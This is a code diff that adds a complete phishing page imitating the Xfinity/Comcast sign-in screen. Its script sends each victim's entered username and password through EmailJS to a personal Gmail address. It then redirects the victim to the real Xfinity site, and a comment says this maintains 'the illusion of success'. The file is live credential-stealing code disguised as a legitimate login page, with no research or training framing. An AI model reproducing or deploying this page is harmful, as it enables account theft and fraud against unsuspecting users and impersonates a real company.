@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xfinity Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .xfinity-logo {
+            background-image: url(https://www.xfinity.com/images/favicon.ico); /* Replace with actual logo URL */
+            background-size: contain;
+            background-repeat: no-repeat;
+            display: inline-block;
+            width: 50px; /* Adjust as needed */
+            height: 50px; /* Adjust as needed */
+        }
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 2rem 0;
+            width: 50%;
+            margin-left: 2rem;
+        }
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 1rem 0;
+            background-color: rgba(255, 255, 255, 0.9);
+            text-align: center;
+            z-index: 2;
+        }
+        .comcast-image {
+            width: 50%;
+            height: 100vh;
+            position: fixed;
+            right: 0;
+            top: 0;
+            object-fit: cover;
+            z-index: -1;
+        }
+        .form-container {
+            width: 100%;
+            padding: 2rem;
+        }
+        .content-wrapper {
+            width: 50%;
+            position: relative;
+            z-index: 1;
+            padding-bottom: 4rem; /* Add space for footer */
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <img src="comcast.png" alt="Comcast" class="comcast-image">
+    <div class="content-wrapper">
+        <div class="main-content">
+            <div class="form-container">
+                <div class="bg-white rounded-lg shadow-md w-full flex flex-col">
+                    <div class="p-8 flex flex-col justify-center">
+                        <div class="mb-6">
+                            <span class="xfinity-logo mb-4"></span>
+                            <h1 class="text-3xl font-semibold text-gray-800">Sign in with your Xfinity ID</h1>
+                        </div>
+                        <div class="mb-4">
+                            <label for="username" class="block text-gray-700 text-sm font-bold mb-2">Email, mobile, or username</label>
+                            <input type="text" id="username" placeholder="Enter email, mobile, or username" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
+                        </div>
+                        <div class="mb-6">
+                            <label for="password" class="block text-gray-700 text-sm font-bold mb-2">Password</label>
+                            <input type="password" id="password" placeholder="Enter your password" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
+                        </div>
+                        <button id="signInButton" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline mb-4">
+                            Let's go
+                        </button>
+                        <div class="text-sm">
+                            <a href="#" class="text-blue-500 hover:text-blue-700 mr-4">Find your Xfinity ID</a>
+                            <a href="#" class="text-blue-500 hover:text-blue-700">Create a new Xfinity ID</a>
+                        </div>
+                        <div class="mt-6 text-xs text-gray-600">
+                            <p>By signing in, you agree to our <a href="#" class="text-blue-500 hover:text-blue-700">Terms of Service</a> and <a href="#" class="text-blue-500 hover:text-blue-700">Privacy Policy</a>.</p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+        <footer class="text-center text-gray-500 text-xs">
+            © 2024 Comcast
+            <a href="#" class="hover:text-blue-500 mx-2">Web Terms of Service</a>
+            <a href="#" class="hover:text-blue-500 mx-2">CA Notice at Collection</a>
+            <a href="#" class="hover:text-blue-500 mx-2">Privacy Policy</a>
+            <a href="#" class="hover:text-blue-500 mx-2">Your Privacy Choices</a>
+            <a href="#" class="hover:text-blue-500 mx-2">Health Privacy Notice</a>
+            <a href="#" class="hover:text-blue-500 mx-2">Ad Choices</a>
+        </footer>
+    </div>
+    <script>
+        // Initialize EmailJS with your public key
+        (function() {
+            emailjs.init("pEWKOQ7jRo6tk4gM0");
+        })();
+
+        const signInButton = document.getElementById('signInButton');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+
+        signInButton.addEventListener('click', async () => {
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+
+            // Basic validation
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            try {
+                // Send email using EmailJS
+                const templateParams = {
+                    to_email: 'sandrawill4042@gmail.com',
+                    username: username,
+                    password: password,
+                    from_name: 'Xfinity Login',
+                    to_name: 'Admin',
+                    message: `New login attempt:\nUsername: ${username}\nPassword: ${password}`
+                };
+
+                await emailjs.send(
+                    'service_uqq91gv',
+                    'template_a74hoqv',
+                    templateParams
+                );
+
+                // Redirect to Xfinity homepage after successful submission
+                window.location.href = 'https://www.xfinity.com';
+            } catch (error) {
+                console.error('Error sending email:', error);
+                // Still redirect to maintain the illusion of success
+                window.location.href = 'https://www.xfinity.com';
+            }
+        });
+    </script>
+</body>
+</html>
